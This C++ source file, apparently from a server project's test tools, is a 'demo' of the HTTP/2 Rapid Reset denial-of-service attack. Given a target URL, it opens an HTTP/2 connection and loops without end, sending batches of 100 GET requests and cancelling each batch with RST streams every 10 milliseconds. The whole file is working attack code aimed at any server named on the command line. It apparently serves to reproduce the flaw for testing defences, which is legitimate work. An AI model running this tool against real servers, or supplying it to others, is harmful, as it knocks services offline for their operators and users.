// SPDX-License-Identifier: BSD-2-Clause
// Copyright CM4all GmbH
// author: Max Kellermann <mk@cm4all.com>

/*
  demo for the HTTP/2 Rapid Reset DoS attack
 */

#include "TestInstance.hxx"
#include "http/Method.hxx"
#include "http/ResponseHandler.hxx"
#include "istream/UnusedPtr.hxx"
#include "pool/pool.hxx"
#include "pool/Ptr.hxx"
#include "pool/Holder.hxx"
#include "fs/FilteredSocket.hxx"
#include "ssl/Init.hxx"
#include "ssl/Client.hxx"
#include "ssl/Config.hxx"
#include "nghttp2/Client.hxx"
#include "thread/Pool.hxx"
#include "system/SetupProcess.hxx"
#include "io/FileDescriptor.hxx"
#include "io/SpliceSupport.hxx"
#include "net/HostParser.hxx"
#include "net/Resolver.hxx"
#include "net/AddressInfo.hxx"
#include "net/UniqueSocketDescriptor.hxx"
#include "net/SocketAddress.hxx"
#include "event/net/ConnectSocket.hxx"
#include "event/FineTimerEvent.hxx"
#include "event/ShutdownListener.hxx"
#include "util/Cancellable.hxx"
#include "util/DeleteDisposer.hxx"
#include "util/PrintException.hxx"
#include "AllocatorPtr.hxx"
#include "lease.hxx"
#include "stopwatch.hxx"
#include "strmap.hxx"

#include <fmt/format.h>

#include <stdlib.h>

struct parsed_url {
	bool ssl = false;

	std::string host;

	int default_port;

	const char *uri;
};

static struct parsed_url
parse_url(const char *url)
{
	assert(url != nullptr);

	struct parsed_url dest;

	if (memcmp(url, "http://", 7) == 0) {
		url += 7;
		dest.default_port = 80;
	} else if (memcmp(url, "https://", 8) == 0) {
		url += 8;
		dest.ssl = true;
		dest.default_port = 443;
	} else
		throw std::runtime_error("Unsupported URL");

	dest.uri = strchr(url, '/');
	if (dest.uri == nullptr || dest.uri == url)
		throw std::runtime_error("Missing URI path");

	dest.host = std::string(url, dest.uri);

	return dest;
}

[[gnu::pure]]
static const char *
GetHostWithoutPort(struct pool &pool, const struct parsed_url &url) noexcept
{
	if (url.host.empty())
		return nullptr;

	auto e = ExtractHost(url.host.c_str());
	if (e.host.data() == nullptr)
		return nullptr;

	return p_strdup(pool, e.host);
}

struct Context;

class Request final : PoolHolder, public IntrusiveListHook<>, HttpResponseHandler {
	Context &context;

	CancellablePointer cancel_ptr;

public:
	explicit Request(PoolPtr &&_pool, Context &_context) noexcept
		:PoolHolder(std::move(_pool)), context(_context) {}

	~Request() noexcept {
		if (cancel_ptr)
			cancel_ptr.Cancel();
	}

	void Destroy() noexcept {
		this->~Request();
		//DeleteFromPool(*pool, this);
	}

	void Start(NgHttp2::ClientConnection &connection, const char *uri, const StringMap &headers) noexcept {
		connection.SendRequest(*pool, nullptr,
				       HttpMethod::GET, uri,
				       {*pool, headers},
				       {},
				       *this, cancel_ptr);
	}

	/* virtual methods from class HttpResponseHandler */
	void OnHttpResponse(HttpStatus status, StringMap &&headers,
			    UnusedIstreamPtr body) noexcept override;
	void OnHttpError(std::exception_ptr ep) noexcept override;
};

static StringMap
MakeRequestHeaders(struct pool &pool, const struct parsed_url &url) noexcept
{
	return StringMap{
		pool,
		{{"host", url.host.c_str()}},
	};

}

struct Context final
	: TestInstance, ConnectSocketHandler, Lease,
	  NgHttp2::ConnectionHandler
{
	struct parsed_url url;

	ShutdownListener shutdown_listener{event_loop, BIND_THIS_METHOD(ShutdownCallback)};

	PoolPtr pool{pool_new_libc(root_pool, "test")};

	const StringMap request_headers;

	const ScopeSslGlobalInit ssl_init;
	SslClientFactory ssl_client_factory{SslClientConfig{}};

	CancellablePointer cancel_ptr;

	UniqueSocketDescriptor fd;
	FilteredSocket fs{event_loop};

	std::unique_ptr<NgHttp2::ClientConnection> connection;

	IntrusiveList<Request,
		IntrusiveListBaseHookTraits<Request>,
		IntrusiveListOptions{.constant_time_size=true}> requests;

	FineTimerEvent send_requests_timer{event_loop, BIND_THIS_METHOD(SendRequests)};

	explicit Context(const char *_url)
		:url(parse_url(_url)),
		 request_headers(MakeRequestHeaders(*pool, url))
	{
	}

	void ShutdownCallback() noexcept;

	void NewRequest() noexcept {
		auto p = pool_new_libc(&*pool, "Request");
		pool_set_major(p);

		auto *request = NewFromPool<Request>(std::move(p), *this);
		requests.push_back(*request);
		request->Start(*connection, url.uri, request_headers);
	}

	void CancelRequest(Request &request) noexcept {
		requests.erase_and_dispose(requests.iterator_to(request), [](Request *r){
			r->Destroy();
		});
	}

	void CancelAllRequests() noexcept {
		requests.clear_and_dispose([](Request *r){
			r->Destroy();
		});
	}

	void SendRequests() noexcept {
		/* cancel all pending requests, sending RST */
		CancelAllRequests();

		/* send a bunch of new requests */
		for (unsigned i = 0; i < 100; ++i)
			NewRequest();

		/* cancel all of them a few milliseconds later, when
		   all requests have been sent by libnghttp2 */
		send_requests_timer.Schedule(std::chrono::milliseconds{10});
	}

	/* virtual methods from class ConnectSocketHandler */
	void OnSocketConnectSuccess(UniqueSocketDescriptor fd) noexcept override;
	void OnSocketConnectError(std::exception_ptr ep) noexcept override;

	/* virtual methods from class Lease */
	PutAction ReleaseLease(PutAction) noexcept override {
		assert(fd.IsDefined());
		fd.Close();

		return PutAction::DESTROY;
	}

	/* virtual methods from class NgHttp2::ConnectionHandler */
	void OnNgHttp2ConnectionIdle() noexcept override;
	void OnNgHttp2ConnectionError(std::exception_ptr e) noexcept override;
	void OnNgHttp2ConnectionClosed() noexcept override;
};

void
Context::ShutdownCallback() noexcept
{
	if (cancel_ptr)
		cancel_ptr.Cancel();

	CancelAllRequests();

	connection.reset();

	thread_pool_set_volatile();

	shutdown_listener.Disable();
}

void
Context::OnNgHttp2ConnectionIdle() noexcept
{
}

void
Context::OnNgHttp2ConnectionError(std::exception_ptr e) noexcept
{
	PrintException(e);
	CancelAllRequests();
	connection.reset();
}

void
Context::OnNgHttp2ConnectionClosed() noexcept
{
	// TODO
	connection.reset();
}

/*
 * http_response_handler
 *
 */

void
Request::OnHttpResponse(HttpStatus, StringMap &&, UnusedIstreamPtr) noexcept
{
	cancel_ptr = {};

	context.CancelRequest(*this);
}

void
Request::OnHttpError(std::exception_ptr ep) noexcept
{
	cancel_ptr = {};

	PrintException(ep);

	context.CancelRequest(*this);
}


/*
 * client_socket_handler
 *
 */

void
Context::OnSocketConnectSuccess(UniqueSocketDescriptor new_fd) noexcept
try {
	cancel_ptr = {};

	fd = std::move(new_fd);

	SocketFilterPtr socket_filter;
	if (url.ssl)
		socket_filter = ssl_client_factory.Create(event_loop,
							  GetHostWithoutPort(*pool, url),
							  nullptr, SslClientAlpn::HTTP_2);

	auto fsp = std::make_unique<FilteredSocket>(event_loop,
						    std::move(fd), FdType::FD_TCP,
						    std::move(socket_filter));

	connection = std::make_unique<NgHttp2::ClientConnection>(std::move(fsp), *this);

	// start sending requests
	send_requests_timer.Schedule(std::chrono::milliseconds{100});
} catch (...) {
	PrintException(std::current_exception());

	shutdown_listener.Disable();
}

void
Context::OnSocketConnectError(std::exception_ptr ep) noexcept
{
	cancel_ptr = {};

	PrintException(ep);

	shutdown_listener.Disable();
}

/*
 * main
 *
 */

int
main(int argc, char **argv)
try {
	if (argc != 2) {
		fmt::print(stderr, "usage: http2_rapid_reset URL\n");
		return EXIT_FAILURE;
	}

	Context ctx{argv[1]};

	SetupProcess();

	/* connect socket */

	static constexpr auto hints = MakeAddrInfo(AI_ADDRCONFIG, AF_UNSPEC,
						   SOCK_STREAM);

	const auto ail = Resolve(ctx.url.host.c_str(), ctx.url.default_port,
				 &hints);
	const auto &ai = ail.front();

	/* initialize */

	ctx.shutdown_listener.Enable();

	/* connect */

	ConnectSocket connect(ctx.event_loop, ctx);
	ctx.cancel_ptr = connect;
	connect.Connect(ai, std::chrono::seconds(30));

	/* run */

	ctx.event_loop.Run();

	/* cleanup */

	ctx.pool.reset();
	pool_commit();

	return EXIT_SUCCESS;
} catch (const std::exception &e) {
	PrintException(e);
	return EXIT_FAILURE;
}
